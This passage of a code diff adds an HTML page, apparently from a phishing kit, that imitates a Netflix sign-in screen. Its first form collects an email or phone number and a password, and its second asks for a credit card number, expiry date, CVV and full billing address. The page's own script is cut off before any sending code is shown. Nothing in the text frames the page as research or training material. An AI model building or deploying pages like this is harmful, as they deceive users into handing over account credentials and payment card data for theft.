@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        body {
+            background: #131313;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+            background-color: #333333;
+            border-radius: 6px;
+            padding: 5px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left: 15px;
+            top: 50%;
+            line-height: 0;
+            color: #b3b3b3;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 1em;
+        }
+
+        section {
+            padding: 25px;
+        }
+
+        .input {
+            border: 0;
+            padding: 15px;
+            padding-left: 10px;
+            padding-right: 10px;
+            padding-top: 15px;
+            padding-bottom: 0px;
+            color: #fff;
+        }
+
+        .input:focus + .cool-input {
+            background-color: #454545;
+        }
+
+        .button {
+            background-color: #d22f27;
+            color: #fff;
+            width: 100%;
+            border: 1px solid #d22f27;
+            border-radius: 6px;
+            padding: 12px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .button:disabled {
+            border: 1px solid #404040;
+            background-color: transparent;
+            color: #bababa;
+        }
+
+        .error {
+            border-bottom: 1px solid #f00 !important
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+        }
+
+        #holderInfo {
+            height: 0;
+            overflow: hidden;
+            transition: 1s;
+        }
+
+        .active {
+            height: 385px !important;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#d22f27"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABGUAAAFtCAMAAACZXyemAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RUE4OEUyOUI4RkQ2MTFFQUEyQUM5MTJBMDIzRjg3QzUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RUE4OEUyOUM4RkQ2MTFFQUEyQUM5MTJBMDIzRjg3QzUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFQTg4RTI5OThGRDYxMUVBQTJBQzkxMkEwMjNGODdDNSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFQTg4RTI5QThGRDYxMUVBQTJBQzkxMkEwMjNGODdDNSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pimq7BAAAALfUExURRISEhMSEhMT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" alt="">
+            </header>
+            <section>
+                <div class="cool-input">
+                    <input type="text" id="login" name="login" onkeyup="checkLength()" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Email or phone number</span>
+                </div>
+                <div class="cool-input">
+                    <input type="password" id="password" name="password" onkeyup="checkLength()" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Password</span>
+                </div>
+
+                <input type="submit" class="button" id="nextPage" disabled value="Sign In">
+
+                <p style="text-align: center;color: #bababa;font-weight: 600;">Need help?</p>
+                <p style="text-align: center;color: #bababa;font-weight: 600;">New to Netflix? Sign up now.</p>
+            </section>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABGUAAAFtCAMAAACZXyemAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RUE4OEUyOUI4RkQ2MTFFQUEyQUM5MTJBMDIzRjg3QzUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RUE4OEUyOUM4RkQ2MTFFQUEyQUM5MTJBMDIzRjg3QzUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFQTg4RTI5OThGRDYxMUVBQTJBQzkxMkEwMjNGODdDNSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFQTg4RTI5QThGRDYxMUVBQTJBQzkxMkEwMjNGODdDNSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pimq7BAAAALfUExURRISEhMSEhMTExQSEhQUFBUSEhYSEhcSEhcXFxgREhgSEhkREhkZGRoREhsREhsbGxwREh0REh4REh8REiAREiEREiIREiIiIiMREiMjIyQREiUREiYREiYmJicREigREigoKCkREioREisREiwREi0REi4REi8REjAQEjEQEjIQEjMQEjQQEjQ0NDUQEjgQEjg4ODkQEjoQEjsQEjs7OzwQEj0QEj4QEj8QEkAQEkEQEkIQEkMQEkQQEkUQEkYQEkcQEkgPEkkPEkoPEkpKSksPEkwPEk4PEk8PEk9PT1APElEPElIPElMPElNTU1QPElUPElYPElcPElkPEloPElsPElwPEl0PEl4PEl8OEmAOEmAOE2EOE2IOE2MOE2QOE2UOE2YOE2ZmZmcOE2dnZ2gOE2kOE2oOE2sOE2wOE20OE24OE28OE3AOE3EOE3FxcXIOE3MOE3QOE3YNE3cNE3gNE3kNE3oNE3sNE3wNE30NE34NE38NE4ANE4ENE4INE4MNE4QNE4UNE4YNE4cNE4gNE4iIiIkNE4mJiYoNE4sNE4wNE40ME44ME48ME5AME5EME5IME5KSkpMME5OTk5QME5SUlJUME5YME5cME5gME5kME5oME5sME5wME50ME54ME58ME6AME6EME6MME6QME6ULE6YLE6cLE6gLE6kLE6mpqaoLE6qqqqsLE60LE64LE68LE7ALE7ELE7ILE7MLE7Ozs7QLE7ULE7YLE7cLE7gLE7kLE7oLE7sLE70KE78KE8AKE8EKE8IKE8MKE8QKE8UKE8YKE8bGxscKE8gKE8kKE8kKFMoKFMsKFMvLy8wKFM0KFM3Nzc4KFM8KFNAKFNEKFNIKFNMKFNQJFNUJFNYJFNcJFNgJFNkJFNoJFNsJFNwJFNzc3N0JFN4JFN8JFOAJFODg4OEJFOIJFOMJFOPj4+QJFOUJFO3t7e7u7vDw8PLy8vn5+fv7+////1V6GT0AAAqrSURBVHja7d37n1RlHcDxs20rIUqiQFarpoRiKIqG4aUM081becOMFM0ytUiDlJQyVDDLW2pFYpoY3qJSSjPEDLQiMkUtRERMJQ2XYtJq/4Bgb/PMziwsynmg57zfP+0+c5jh8Pq+Pi9mnjkzWQYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG1mp0+K6iht+WL7l2vLquaV1mtl21Dal9ZrcdmTTeg47oO2weeWVc9d1NkvKx723Y62xubzY/O6KwwetCh5quGGAnCtTOiTNymS3B/c3vuLwycEtD5gFyL0yNyRamaOC+1sQHr3ls8EtJ5kFyL0yL/ROszINwWrpoODok4L1pb3MAuRemdIJaVam4onR9ODoudV/HyDXytyRaGWGrC4vr+jXubxP8DirBhkFiFCZ5gFpVia7L7jHz3auXh+s3mkSIEZlSmcmWplPBvf4UMfidiuC1SaTAFEqMyfRyvT5a3CXe7UvjgvWFtaZBIhSmdWD06xMdk1wl1e0LdUtDNbOMQgQpzKliYlWZkRwl8u3rHrkl/sbBIhUmd9vQGX+cHC1YW1H1QdLV5T/xOPB8uCqyjxe4/4O7rdxKpPND07yxNaV8B3B08wBZIfevVWMypT27Xll5vXsAc4u/4lHqm9tWuetnd50ZYK/RWn22oWKS5hGGDDY87WWJ3eIUZnLEq1M/1e6vPoUvlPv1wYM3vm3lpaWV/eOUJkl9WlWJrs5OMmvZVmvpcHvJ5swCu9tf2xZ6/Uj8q9M6bBEKzMqOMfF9RWXMC3rbcQovLtbI9Py349HqMyNiVam7rHgJA/PHgh+u9SEUXjfaotMy5ciPGMqvdgnzcpkE4OTvC28hOkfuxoxiu6M9sh8J4tRmfZ93vQqs1OwqdQcbmPPMmIU3aH/aYvMr94apzJ3JVqZbFY3b/w70oxRcHu+1haZv7w9i1OZ5oGJVubY2pF5zCVMFFzrHvYa/3xPFqkyHRdmJ1eZLZbWrMwEQ0axte9ht/z7/Vm0ysxNtDLZlFqReWWAKaPYfprjHnZ3lSntmmhlhtaqzI2GjGLLdQ+728p8JdHKZHNqnOxIU0ahdexhfy+LWpkFm6YyS86utP1Gr8zY6nOdZ8ootJz3sLutTGm/HlVm2fXTpt90y8w7Zs2+74GH5s2f8WYr09WIjV6Zvi9WPcipxowi2/Nf+e5hd1+Zb/aoMj38X8FmVJnsuq6PsbyPOaPAct/D7r4yz9QnWpmRXR9jqjmjwPLfw+6+Mq2f6J9iZbJHKh9i9RCDRoHlv4e9jsr8INXKjKt8iHvMGQUWYQ+7qjKPd/700taJVmbgyoqHONqgUVwx9rCrKjO1ufPHTyRamezW8BGeqDdpFFaUPeyqypz3k/DTENKszOHhI5xv0iisOHvY1ZU5pXxh9vaJVuac8BE+YtRQmciV2a78qsXZaVamflHJ1zDBJnzGlN3Z+fOD8Svz90cq7ZFDZY6r/PTRvkaN4vpM+6u/349bmeCT/YestzLLb7h66kUXnj/h3HO+OG7cuC+MfrOVyf9qySy7v7KMnzJpFNjlm2An+7ysX/m70S5M8JrsbL8u//+616BRZJvgXXnnZdltnb8sTLEyN3WpzOrBBo0C2wRXGKypzAnl3/6UXmV2bO76YtIkg0aRvSP61ZJrKrP1ilov7KZSmYuqzmyRjxan0KJ/8sOaymQzEq5Mn2XVpzbKnFFosT/Fam1ljk24Mp/u5rpQKLAzIuxnd6lM7xfTrcxva5zain7GjGK7POqni6+tTNU2TDqVOazmmwlPM2UUXNRvSmmtzFHJVqb2N9jOMWQUXNRvfWutTK/nE63M0NW1r4zY3ZRRcDG/wba1Mtm0RCtzTTfXX002ZBRd3vvZVZVpSrMy/cN3At0e/LzYW2YovJz3s6sq07AsycpMCM5n1aA5XT5KHYot30/nrKpMdm2KlWn4c3A+M7NTg99mGDHIdT+7ujKjNu/K/Gz858Yc23Tg8CGNfTegMqPD8/lQts1Lwefa9DdikOd+dnVl6pduSGW2eNfQA4488fTxX73s+hmz7p+Sf2XCZz7PL3r4l3fdfM0x66/M3OCPzc8qX+M+04RB+37260dEqUx2Vc8qs3zmL+Y/1eWtwrdFrUyHK9dbmf3Dw8euWTgw+P0hEwZt+9mv7h3nGVP2wZ5VppaZm2llwotAn+29dmVBsDLMhMHa/ewnd8giVaZucWqV2SX8YJmLWpfGBytTDBhk2aF3b5XFqkz2jdQqc3FwcPNOrUuNQXiWNhgwyE+tyuyfWGX6Pl9j4zp8Z95R5gDiVqbuibQqc2Z48AHti0ev+0VrIM/KZJcmVZm6BbU2lBqeCZ5FDTQIELcyI5KqzEfDY8d0Ll8SrI4zCBC3MtmjsSqz8+mdjs+rMvcEhz7Tq3P5fV3eqAfErMzX32BlflT9ANvtNmjnxu0HbNu3d8Mbv/p58L4HNR1z4mmfnzDp0iun3XL77N8sfHZlTyszrLuvRgkvmRxuEiBuZfbagMq88NiDP54+5cunfezA3QfE/BSFPo1D928affqEyVePWWdlrgv+risbgzsYG9xwhUmAuJWpeGtsdWVWPv3wz2dcNems0YcM37HX5nQ2p06cct2t98xf0lyuzMCXgzO5KTw4vGRyWS+jAHErM6mbyuxz8pEjd9v8P/e/buCwLTvCE15q9YGKo74b3HKcUYC4ldmj47Lnp+674YKD/r9Psd8eTWMvmHbvolWluZU3hJdM3mUUIG5lsjtmfXvimA/vukVCp9oweJcuK8HzwuZGswBxK1MI4SWT480C5FqZ5+bNnDqyeGffOOqsK2c/3fov8DuzAPl4bu7084/fa5tC/xtsO/KUS+58dF/DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAENlbAPKkMoDKACoDoDKAygAqA6AygMoAKgOgMoDKAKgMoDKAygCoDKAygMoAqAygMoDKAKgMoDIAKgOoDKAyACoDqAygMgAqA6gMoDIAKgOoDIDKACoDqAyAygAqA6gMgMoAKgOoDIDKACoDoDKAygAqA6AygMoAKgOgMoDKACoDoDKAygCoDKAygMoAqAygMoDKAKgMoDKAygCoDKAyACoDqAygMgAqA6gMoDIAKgOoDKAyACoDqAyAygAqA6gMgMoAKgOoDIDKACoDqAyAygAqA6AygMoAKgOgMoDKACoDoDKAygAqA6AygMoAqAygMoDKAKgMoDKAygCoDKAygMoAqAygMgAqA6gMoDIAKgOoDKAyACoDqAygMgAqA6gMgMoAKgOoDIDKACoDqAyAygAqA6AygMoAKgOgMoDKACoDoDKAygAqA6AygMoAqAygMoDKAKgMoDKAygCoDKAygMoAqAygMgAqA6gMoDIAKgOoDKAyACoDqAygMgAqA6gMgMoAKgOoDIDKACoDqAyAygAqA6gMgMoAKgOgMoDKACoDoDKAygAqA6AygMoAKgOgMoDKAKgMoDKAygCoDKAygMoAqAygMoDKAKgMoDIAKgOoDKAyACoDqAygMgAqA6gMoDIAKgOoDIDKACoDqAyAygAqA6gMgMoAKgOoDIDKACoDoDKAygAqA6AygMoAKgOgMoDKAEX2PwelG78HHYkpAAAAAElFTkSuQmCC" alt="">
+            </header>
+            <section>
+                <div class="cool-input" id="ccBlock">
+                    <input type="tel" id="cc" name="cc" onkeyup="check();check5();" maxlength="19" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Credit Card</span>
+                </div>
+                    
+                <div class="grid">
+                    <div class="cool-input" id="mmBlock" style="width: 95%;">
+                        <input type="tel" id="expMM" name="expMM" maxlength="2" onkeyup="check2();check5();" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">MM</span>
+                    </div>
+                    <div class="cool-input" id="yyBlock" style="width: 95%;">
+                        <input type="tel" id="expYY" name="expYY" maxlength="2" onkeyup="check3();check5();checkYear()" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">YY</span>
+                    </div>
+                    <div class="cool-input" id="cvvBlock" style="width: 100%;">
+                        <input type="password" id="cvv" name="cvv" maxlength="3" onkeyup="check4();check5();checkYear()" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">CVV</span>
+                    </div>
+                </div>
+                
+                <div id="holderInfo">
+                    <div class="cool-input">
+                        <input type="text" id="holderName" name="holderName" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">Name</span>
+                    </div>
+                    <span style="font-size: 12px;color: #f00;margin-top: -47px;position: relative;float: right;font-weight: 600;display: none;right: 10px;" id="errorName">Required field</span>
+                    <div class="cool-input">
+                        <input type="text" id="country" name="country" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">Country</span>
+                    </div>
+                    <span style="font-size: 12px;color: #f00;margin-top: -47px;position: relative;float: right;font-weight: 600;display: none;right: 10px;" id="errorCountry">Required field</span>
+                    <div class="cool-input">
+                        <input type="text" id="address" name="address" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">Street address</span>
+                    </div>
+                    <span style="font-size: 12px;color: #f00;margin-top: -47px;position: relative;float: right;font-weight: 600;display: none;right: 10px;" id="errorStreet">Required field</span>
+                    <div class="cool-input">
+                        <input type="text" id="aptSuite" name="aptSuite" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">Apt./Suite</span>
+                    </div>
+                    <div class="cool-input">
+                        <input type="text" id="city" name="city" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">City</span>
+                    </div>
+                    <span style="font-size: 12px;color: #f00;margin-top: -47px;position: relative;float: right;font-weight: 600;display: none;right: 10px;" id="errorCity">Required field</span>
+                    <div class="cool-input">
+                        <input type="tel" id="postalCode" name="postalCode" class="input cool-input__input" autocomplete="off">
+                        <span class="cool-input__placeholder">Postal code</span>
+                    </div>
+                </div>
+
+                <input type="submit" class="button" id="sendData" disabled value="Continue">
+
+                <p style="text-align: center;color: #bababa;font-weight: 600;">Need help?</p>
+                <p style="text-align: center;color: #bababa;font-weight: 600;">New to Netflix? Sign up now.</p>
+            </section>
+        </div>
+    </form>
+
+    <script>
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3'),
+            spinner = document.getElementById('spinner'),
+            login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            cc = document.getElementById('cc'),
+            expMM = document.getElementById('expMM'),
+            expYY = document.getElementById('expYY'),
+            cvv = document.getElementById('cvv'),
+            nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData'),
+            ccBlock = document.getElementById('ccBlock'),
+            mmBlock = document.getElementById('mmBlock'),
+            yyBlock = document.getElementById('yyBlock'),
+            cvvBlock = document.getElementById('cvvBlock'),
+            holderInfo = document.getElementById('holderInfo'),
+            country = document.getElementById('country'),
+            address = document.getElementById('address'),
+            aptSuite = document.getElementById('aptSuite'),
+            city = document.getElementById('city'),
+            postalCode = document.getElementById('postalCode'),
+            errorCity = document.getElementById('errorCity'),
+            errorCountry = document.getElementById('errorCountry'),
